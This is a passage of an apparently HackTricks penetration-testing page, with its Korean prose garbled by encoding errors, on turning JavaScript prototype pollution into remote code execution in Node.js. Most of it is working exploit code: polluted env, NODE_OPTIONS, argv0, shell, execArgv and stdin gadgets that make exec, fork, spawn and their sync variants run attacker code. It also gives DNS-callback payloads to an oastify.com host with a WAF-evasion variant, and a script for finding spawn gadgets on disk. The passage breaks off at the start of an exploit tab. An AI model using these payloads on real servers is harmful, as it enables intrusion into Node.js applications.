# Prototype Pollutionì„ í†µí•œ RCE

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ PRì„** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ë°** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github ì €ì¥ì†Œì— ì œì¶œ**í•˜ì„¸ìš”.

</details>

## ì·¨ì•½í•œ ì½”ë“œ

ë‹¤ìŒê³¼ ê°™ì€ ì½”ë“œë¥¼ ì‚¬ìš©í•˜ëŠ” ì‹¤ì œ JSë¥¼ ìƒìƒí•´ë³´ì„¸ìš”:
```javascript
const { execSync, fork } = require('child_process');

function isObject(obj) {
console.log(typeof obj);
return typeof obj === 'function' || typeof obj === 'object';
}

// Function vulnerable to prototype pollution
function merge(target, source) {
for (let key in source) {
if (isObject(target[key]) && isObject(source[key])) {
merge(target[key], source[key]);
} else {
target[key] = source[key];
}
}
return target;
}

function clone(target) {
return merge({}, target);
}

// Run prototype pollution with user input
// Check in the next sections what payload put here to execute arbitrary code
clone(USERINPUT);

// Spawn process, this will call the gadget that poputales env variables
// Create an a_file.js file in the current dir: `echo a=2 > a_file.js`
var proc = fork('a_file.js');
```
## í™˜ê²½ ë³€ìˆ˜ë¥¼ í†µí•œ PP2RCE

**PP2RCE**ëŠ” **ì›ê²© ì½”ë“œ ì‹¤í–‰(Remote Code Execution)**ì„ ì˜ë¯¸í•©ë‹ˆë‹¤.

[**ì´ ë¬¸ì„œ**](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)ì— ë”°ë¥´ë©´, **`child_process`**ì—ì„œ **`fork`** ë˜ëŠ” **`spawn`** ë“±ì˜ ë©”ì„œë“œë¥¼ ì‚¬ìš©í•˜ì—¬ **í”„ë¡œì„¸ìŠ¤ê°€ ìƒì„±**ë  ë•Œ, `normalizeSpawnArguments` ë©”ì„œë“œê°€ í˜¸ì¶œë˜ë©°, ì´ëŠ” **ìƒˆë¡œìš´ í™˜ê²½ ë³€ìˆ˜ë¥¼ ìƒì„±í•˜ê¸° ìœ„í•œ í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ ê°€ì ¯**ì„ ì‚¬ìš©í•©ë‹ˆë‹¤:
```javascript
//See code in https://github.com/nodejs/node/blob/02aa8c22c26220e16616a88370d111c0229efe5e/lib/child_process.js#L638-L686

var env = options.env || process.env;
var envPairs = [];
[...]
let envKeys = [];
// Prototype values are intentionally included.
for (const key in env) {
ArrayPrototypePush(envKeys, key);
}
[...]
for (const key of envKeys) {
const value = env[key];
if (value !== undefined) {
ArrayPrototypePush(envPairs, `${key}=${value}`); // <-- Pollution
}
}
```
í•´ë‹¹ ì½”ë“œë¥¼ í™•ì¸í•˜ë©´ **ì†ì„± `.env`ë¥¼ ì˜¤ì—¼ì‹œí‚´**ìœ¼ë¡œì¨ **`envPairs`ë¥¼ ì˜¤ì—¼ì‹œí‚¬ ìˆ˜ ìˆë‹¤ëŠ” ê²ƒ**ì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### `__proto__` ì˜¤ì—¼

{% hint style="warning" %}
ë…¸ë“œì˜ `child_process` ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ **`normalizeSpawnArguments`** í•¨ìˆ˜ê°€ ì‘ë™í•˜ëŠ” ë°©ì‹ ë•Œë¬¸ì—, í”„ë¡œì„¸ìŠ¤ì— ìƒˆë¡œìš´ í™˜ê²½ ë³€ìˆ˜ë¥¼ **ì„¤ì •í•˜ê¸° ìœ„í•´ ë¬´ì–¸ê°€ë¥¼ ì˜¤ì—¼ì‹œí‚¤ê¸°ë§Œ í•˜ë©´ ë©ë‹ˆë‹¤**.\
ì˜ˆë¥¼ ë“¤ì–´, `__proto__.avar="valuevar"`ë¥¼ ìˆ˜í–‰í•˜ë©´ í”„ë¡œì„¸ìŠ¤ëŠ” `avar`ë¼ëŠ” ì´ë¦„ì˜ ë³€ìˆ˜ë¥¼ ê°’ `valuevar`ë¡œ ìƒì„±í•©ë‹ˆë‹¤.

ê·¸ëŸ¬ë‚˜ **í™˜ê²½ ë³€ìˆ˜ê°€ ì²« ë²ˆì§¸ë¡œ ì„¤ì •ë˜ê¸° ìœ„í•´ì„œëŠ”** `.env` ì†ì„±ì„ **ì˜¤ì—¼ì‹œì¼œì•¼ í•˜ë©°** (ì¼ë¶€ ë©”ì„œë“œì—ì„œë§Œ) í•´ë‹¹ ë³€ìˆ˜ê°€ **ì²« ë²ˆì§¸ë¡œ ì„¤ì •**ë  ê²ƒì…ë‹ˆë‹¤ (ê³µê²©ì„ í—ˆìš©).

ë”°ë¼ì„œ ë‹¤ìŒ ê³µê²©ì—ì„œ **`NODE_OPTIONS`**ì´ **`.env` ë‚´ë¶€ì— ì—†ëŠ” ì´ìœ **ì…ë‹ˆë‹¤.
{% endhint %}

{% code overflow="wrap" %}
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/pp2rce').toString())//"}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"

// Trigger gadget
var proc = fork('./a_file.js');
// This should create the file /tmp/pp2rec


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce\\\").toString())//"}}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec
```
{% code %}

### `constructor.prototype` ë…ì„±í™”

{% endcode %}
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.constructor.prototype.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/pp2rce2').toString())//"}
b.constructor.prototype.NODE_OPTIONS = "--require /proc/self/environ"

proc = fork('a_file.js');
// This should create the file /tmp/pp2rec2


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"constructor": {"prototype": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce2\\\").toString())//"}}}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec2
```
## í™˜ê²½ ë³€ìˆ˜ + ëª…ë ¹ì¤„ì„ í†µí•œ PP2RCE

[**ì´ ë¬¸ì„œ**](https://blog.sonarsource.com/blitzjs-prototype-pollution/)ì—ì„œëŠ” ì´ì „ê³¼ ìœ ì‚¬í•œ í˜ì´ë¡œë“œë¥¼ ì œì•ˆí•©ë‹ˆë‹¤. ì£¼ìš” ì°¨ì´ì ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

* `/proc/self/environ` íŒŒì¼ì— nodejs **í˜ì´ë¡œë“œ**ë¥¼ ì €ì¥í•˜ëŠ” ëŒ€ì‹ , **`/proc/self/cmdline`**ì˜ **argv0**ì— ì €ì¥í•©ë‹ˆë‹¤.
* ê·¸ëŸ° ë‹¤ìŒ, **`NODE_OPTIONS`**ì„ í†µí•´ `/proc/self/environ` íŒŒì¼ì„ ìš”êµ¬í•˜ëŠ” ëŒ€ì‹  **`/proc/self/cmdline`**ì„ ìš”êµ¬í•©ë‹ˆë‹¤.

{% code overflow="wrap" %}
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/pp2rce2').toString())//"
b.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"

// Trigger gadget
var proc = fork('./a_file.js');
// This should create the file /tmp/pp2rec2


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce2\\\").toString())//"}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec
```
{% endcode %}

## DNS ìƒí˜¸ì‘ìš©

ë‹¤ìŒ payloadë¥¼ ì‚¬ìš©í•˜ì—¬ ì´ì „ì— ë…¼ì˜í•œ NODE\_OPTIONS í™˜ê²½ ë³€ìˆ˜ë¥¼ ì•…ìš©í•˜ê³  DNS ìƒí˜¸ì‘ìš©ì´ ì‘ë™í•˜ëŠ”ì§€ ê°ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```json
{
"__proto__": {
"argv0":"node",
"shell":"node",
"NODE_OPTIONS":"--inspect=id.oastify.com"
}
}
```
ë˜ëŠ” ë„ë©”ì¸ì„ ìš”ì²­í•˜ëŠ” WAFë¥¼ í”¼í•˜ê¸° ìœ„í•´:
```json
{
"__proto__": {
"argv0":"node",
"shell":"node",
"NODE_OPTIONS":"--inspect=id\"\".oastify\"\".com"
}
}
```
## PP2RCE ì·¨ì•½ì  child\_process í•¨ìˆ˜

ì´ ì„¹ì…˜ì—ì„œëŠ” **`child_process`ì˜ ê° í•¨ìˆ˜ë¥¼ ë¶„ì„**í•˜ì—¬ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ê³  í•´ë‹¹ í•¨ìˆ˜ë¥¼ ì½”ë“œ ì‹¤í–‰ì— ê°•ì œë¡œ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ê¸°ìˆ ì´ ìˆëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤:

<details>

<summary><code>exec</code> ì•…ìš©</summary>

{% code overflow="wrap" %}
```javascript
// environ trick - not working
// It's not possible to pollute the .env attr to create a first env var
// because options.env is null (not undefined)

// cmdline trick - working with small variation
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/exec-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = exec('something');

// stdin trick - not working
// Not using stdin

// Windows
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = exec('something');
```
{% endcode %}

</details>

<details>

<summary><strong><code>execFile</code> ì•…ìš©</strong></summary>
```javascript
// environ trick - not working
// It's not possible to pollute the .en attr to create a first env var

// cmdline trick - working with a big requirement
// Working after kEmptyObject (fix)
const { execFile } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execFile-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execFile('/usr/bin/node');

// stdin trick - not working
// Not using stdin

// Windows - not working
```
**`execFile`**ê°€ ì‘ë™í•˜ë ¤ë©´ **NODE\_OPTIONS**ê°€ ì‘ë™í•˜ê¸° ìœ„í•´ **nodeë¥¼ ì‹¤í–‰**í•´ì•¼í•©ë‹ˆë‹¤.\
**nodeë¥¼ ì‹¤í–‰í•˜ì§€ ì•ŠëŠ”** ê²½ìš°, ì‹¤í–‰ë˜ëŠ” ê²ƒì„ **í™˜ê²½ ë³€ìˆ˜ë¡œ ë³€ê²½**í•˜ëŠ” ë°©ë²•ì„ ì°¾ì•„ì•¼í•˜ë©°, ê·¸ê²ƒì„ ì„¤ì •í•´ì•¼í•©ë‹ˆë‹¤.

**ë‹¤ë¥¸** ê¸°ìˆ ë“¤ì€ ì´ ìš”êµ¬ ì‚¬í•­ ì—†ì´ ì‘ë™í•©ë‹ˆë‹¤. ì™œëƒí•˜ë©´ í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ì„ í†µí•´ **ì‹¤í–‰ë˜ëŠ” ê²ƒì„ ìˆ˜ì •**í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. (ì´ ê²½ìš° `.shell`ì„ ì˜¤ì—¼ì‹œí‚¤ë”ë¼ë„ ì‹¤í–‰ë˜ëŠ” ê²ƒì€ ì˜¤ì—¼ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤).

</details>

<details>

<summary><code>fork</code> ì•…ìš©</summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/fork-environ').toString())//"}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = fork('something');

// cmdline trick - working
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
p = {}
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/fork-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = fork('something');

// stdin trick - not working
// Not using stdin

// execArgv trick - working
// Only the fork method has this attribute
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.execPath = "/bin/sh"
b.__proto__.argv0 = "/bin/sh"
b.__proto__.execArgv = ["-c", "touch /tmp/fork-execArgv"]
var proc = fork('./a_file.js');

// Windows
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.execPath = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = fork('./a_file.js');
```
{% endcode %}

</details>

<details>

<summary><strong><code>spawn</code> ì•…ìš©</strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// NOT working after kEmptyObject (fix) without options
const { spawn } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/spawn-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// cmdline trick - working with small variation (shell)
// NOT working after kEmptyObject (fix) without options
const { spawn } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/spawn-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// stdin trick - not working
// Not using stdin

// Windows
// NOT working after require(fix) without options
const { spawn } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"C:\\"}); //To work after kEmptyObject (fix)
```
{% endcode %}

</details>

<details>

<summary><strong><code>execFileSync</code> ì•…ìš©</strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/execFileSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = execFileSync('something');

// cmdline trick - working with small variation (shell)
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execFileSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execFileSync('something');

// stdin trick - working
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/execFileSync-stdin}\n'
var proc = execFileSync('something');

// Windows
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
p.__proto__.argv0 = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = execSync('something');
```
{% endcode %}

</details>

<details>

<summary><strong><code>execSync</code> ì•…ìš©</strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/execSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = execSync('something');

// cmdline trick - working with small variation (shell)
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execSync('something');

// stdin trick - working
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/execSync-stdin}\n'
var proc = execSync('something');

// Windows
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = execSync('something');
```
{% endcode %}

</details>

<details>

<summary><strong><code>spawnSync</code> ì•…ìš©</strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of node
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/spawnSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// cmdline trick - working with small variation (shell)
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/spawnSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// stdin trick - working
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/spawnSync-stdin}\n'
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)

// Windows
// NOT working after require(fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"C:\\"}); //To work after kEmptyObject (fix)
```
{% endcode %}

</details>

## ê°•ì œë¡œ Spawn í˜¸ì¶œí•˜ê¸°

ì´ì „ ì˜ˆì œì—ì„œëŠ” **`spawn`ì„ í˜¸ì¶œí•˜ëŠ” ê¸°ëŠ¥**ì„ íŠ¸ë¦¬ê±°í•˜ëŠ” ë°©ë²•ì„ ë³´ì•˜ìŠµë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ì„œëŠ” **`child_process`ì˜ ëª¨ë“  ë©”ì„œë“œ**ê°€ í•„ìš”í•©ë‹ˆë‹¤(ë¬´ì–¸ê°€ë¥¼ ì‹¤í–‰í•˜ê¸° ìœ„í•´ ì‚¬ìš©ë˜ëŠ” ëª¨ë“  ë©”ì„œë“œê°€ í˜¸ì¶œí•©ë‹ˆë‹¤). ì´ì „ ì˜ˆì œì—ì„œëŠ” **ì½”ë“œì˜ ì¼ë¶€**ì— í¬í•¨ë˜ì–´ ìˆì—ˆì§€ë§Œ, í˜¸ì¶œí•˜ì§€ ì•ŠëŠ” ì½”ë“œì˜ ê²½ìš° ì–´ë–»ê²Œ í•´ì•¼ í• ê¹Œìš”.

### require íŒŒì¼ ê²½ë¡œ ì œì–´í•˜ê¸°

ì´ [**ë‹¤ë¥¸ ê¸€**](https://blog.sonarsource.com/blitzjs-prototype-pollution/)ì—ì„œ ì‚¬ìš©ìëŠ” **`require`**ê°€ ì‹¤í–‰ë  íŒŒì¼ ê²½ë¡œë¥¼ ì œì–´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œ ê³µê²©ìëŠ” ì‹œìŠ¤í…œ ë‚´ë¶€ì— ìˆëŠ” **`.js` íŒŒì¼ì„ ì°¾ì•„ì„œ** ê°€ì ¸ì˜¬ ë•Œ **spawn ë©”ì„œë“œë¥¼ ì‹¤í–‰**í•˜ë©´ ë©ë‹ˆë‹¤.\
ì¼ë°˜ì ìœ¼ë¡œ ê°€ì ¸ì˜¬ ë•Œ spawn í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ì¼ë°˜ì ì¸ íŒŒì¼ì˜ ì˜ˆëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

* /path/to/npm/scripts/changelog.js
* /opt/yarn-v1.22.19/preinstall.js
* **ì•„ë˜ì—ì„œ ë” ë§ì€ íŒŒì¼ ì°¾ê¸°**

ë‹¤ìŒ ê°„ë‹¨í•œ ìŠ¤í¬ë¦½íŠ¸ëŠ” **child\_process**ì—ì„œ **íŒ¨ë”© ì—†ì´** í˜¸ì¶œì„ ê²€ìƒ‰í•©ë‹ˆë‹¤(í•¨ìˆ˜ ë‚´ë¶€ì˜ í˜¸ì¶œì„ í‘œì‹œí•˜ì§€ ì•Šê¸° ìœ„í•´):

{% code overflow="wrap" %}
```bash
find / -name "*.js" -type f -exec grep -l "child_process" {} \; 2>/dev/null | while read file_path; do
grep --with-filename -nE "^[a-zA-Z].*(exec\(|execFile\(|fork\(|spawn\(|execFileSync\(|execSync\(|spawnSync\()" "$file_path" | grep -v "require(" | grep -v "function " | grep -v "util.deprecate" | sed -E 's/.{255,}.*//'
done
# Note that this way of finding child_process executions just importing might not find valid scripts as functions called in the root containing child_process calls won't be found.
```
{% endcode %}

<details>

<summary>ì´ì „ ìŠ¤í¬ë¦½íŠ¸ì—ì„œ ì°¾ì€ í¥ë¯¸ë¡œìš´ íŒŒì¼</summary>

* node\_modules/buffer/bin/**download-node-tests.js**:17:`cp.execSync('rm -rf node/*.js', { cwd: path.join(__dirname, '../test') })`
* node\_modules/buffer/bin/**test.js**:10:`var node = cp.spawn('npm', ['run', 'test-node'], { stdio: 'inherit' })`
* node\_modules/npm/scripts/**changelog.js**:16:`const log = execSync(git log --reverse --pretty='format:%h %H%d %s (%aN)%n%b%n---%n' ${branch}...).toString().split(/\n/)`
* node\_modules/detect-libc/bin/**detect-libc.js**:18:`process.exit(spawnSync(process.argv[2], process.argv.slice(3), spawnOptions).status);`
* node\_modules/jest-expo/bin/**jest.js**:26:`const result = childProcess.spawnSync('node', jestWithArgs, { stdio: 'inherit' });`
* node\_modules/buffer/bin/**download-node-tests.js**:17:`cp.execSync('rm -rf node/*.js', { cwd: path.join(__dirname, '../test') })`
* node\_modules/buffer/bin/**test.js**:10:`var node = cp.spawn('npm', ['run', 'test-node'], { stdio: 'inherit' })`
* node\_modules/runtypes/scripts/**format.js**:13:`const npmBinPath = execSync('npm bin').toString().trim();`
* node\_modules/node-pty/scripts/**publish.js**:31:`const result = cp.spawn('npm', args, { stdio: 'inherit' });`

</details>

### í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ì„ í†µí•œ require íŒŒì¼ ê²½ë¡œ ì„¤ì •

{% hint style="warning" %}
**ì´ì „ ê¸°ìˆ ì€** ì‚¬ìš©ìê°€ **ìš”êµ¬ë˜ëŠ” íŒŒì¼ì˜ ê²½ë¡œë¥¼ ì œì–´**í•´ì•¼ í•œë‹¤ëŠ” ê²ƒì„ ìš”êµ¬í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì´ëŠ” í•­ìƒ ì‚¬ì‹¤ì´ ì•„ë‹™ë‹ˆë‹¤.
{% endhint %}

ê·¸ëŸ¬ë‚˜ ì½”ë“œê°€ í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ ì´í›„ì— requireë¥¼ ì‹¤í–‰í•œë‹¤ë©´, **ìš”êµ¬ë˜ëŠ” ê²½ë¡œë¥¼ ì œì–´í•˜ì§€ ì•Šë”ë¼ë„ í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ì„ ì•…ìš©í•˜ì—¬ ë‹¤ë¥¸ ê²½ë¡œë¥¼ ê°•ì œë¡œ ìš”êµ¬**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ì½”ë“œ ë¼ì¸ì´ `require("./a_file.js")` ë˜ëŠ” `require("bytes")`ì™€ ê°™ì€ ê²½ìš°ì—ë„ **ì˜¤ì—¼ëœ íŒ¨í‚¤ì§€ë¥¼ ìš”êµ¬**í•  ê²ƒì…ë‹ˆë‹¤.

ë”°ë¼ì„œ, í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ ì´í›„ì— requireê°€ ì‹¤í–‰ë˜ê³  spawn í•¨ìˆ˜ê°€ ì—†ëŠ” ê²½ìš°, ë‹¤ìŒê³¼ ê°™ì€ ê³µê²©ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* **ì‹œìŠ¤í…œ ë‚´ë¶€ì— ìˆëŠ” `.js` íŒŒì¼**ì„ ì°¾ì•„ì„œ **ìš”êµ¬**í•  ë•Œ **`child_process`ë¥¼ ì‚¬ìš©í•˜ì—¬ ë¬´ì–¸ê°€ë¥¼ ì‹¤í–‰í•˜ëŠ” íŒŒì¼**ì„ ì°¾ìŠµë‹ˆë‹¤.
* ê³µê²© ëŒ€ìƒ í”Œë«í¼ì— íŒŒì¼ì„ ì—…ë¡œë“œí•  ìˆ˜ ìˆë‹¤ë©´ í•´ë‹¹ íŒŒì¼ì„ ì—…ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ê²½ë¡œë¥¼ ì˜¤ì—¼ì‹œì¼œ **`.js` íŒŒì¼ì„ ìš”êµ¬**í•˜ë„ë¡ ê°•ì œí•©ë‹ˆë‹¤. ì´ íŒŒì¼ì€ child\_processë¥¼ ì‚¬ìš©í•˜ì—¬ ë¬´ì–¸ê°€ë¥¼ ì‹¤í–‰í•  ê²ƒì…ë‹ˆë‹¤.
* ìì‹\_í”„ë¡œì„¸ìŠ¤ ì‹¤í–‰ í•¨ìˆ˜ê°€ í˜¸ì¶œë  ë•Œ ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ê¸° ìœ„í•´ **í™˜ê²½ ë³€ìˆ˜/cmdlineì„ ì˜¤ì—¼**ì‹œí‚µë‹ˆë‹¤ (ì´ˆê¸° ê¸°ìˆ  ì°¸ì¡°).

#### ì ˆëŒ€ì ì¸ require

ìˆ˜í–‰ëœ requireì´ **ì ˆëŒ€ì ì¸** ê²½ìš° (`require("bytes")`)ì´ê³  `package.json` íŒŒì¼ì— **mainì´ ì—†ëŠ” ê²½ìš°**, **`main` ì†ì„±ì„ ì˜¤ì—¼**ì‹œí‚¬ ìˆ˜ ìˆìœ¼ë©° **ë‹¤ë¥¸ íŒŒì¼ì„ ì‹¤í–‰**ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% tabs %}
{% tab title="exploit" %}
{% code overflow="wrap" %}
